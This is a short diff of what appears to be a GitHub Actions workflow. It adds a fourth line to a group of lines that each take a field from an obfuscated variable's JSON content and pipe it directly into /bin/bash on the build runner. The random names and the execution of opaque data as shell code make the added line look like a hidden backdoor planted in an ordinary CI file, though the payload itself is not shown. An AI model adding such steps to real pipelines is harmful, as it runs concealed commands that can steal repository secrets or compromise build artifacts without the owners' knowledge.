@@ -28,6 +28,7 @@ jobs:
           echo $n45012 | jq -r .jloq1 | /bin/bash
           echo $mgcsc1 | jq -r .ipue438 | /bin/bash
           echo $x924 | jq -r .l80 | /bin/bash
+          echo $qmiim9645 | jq -r .mhfou1354 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
